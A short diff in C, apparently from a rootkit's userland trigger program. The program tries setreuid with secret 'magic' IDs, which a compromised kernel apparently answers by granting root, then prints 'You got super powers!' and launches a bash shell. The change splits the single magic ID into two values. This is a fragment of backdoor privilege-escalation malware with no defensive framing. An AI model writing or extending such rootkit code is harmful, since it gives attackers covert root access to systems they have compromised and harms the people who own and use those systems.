@@ -21,7 +21,7 @@ int main(int argc, char *argv[])
 	if(geteuid() == 0){
 		printf("You are already root! :)\n\n");
 		exit(0);
-	} else if (setreuid(MAGIC_ID, MAGIC_ID) == 0){
+	} else if (setreuid(MAGIC_ID_1, MAGIC_ID_2) == 0){
 		printf("\e[01;36mYou got super powers!\e[00m\n\n");
 		execve(bash, arg, envp);
 	} else {
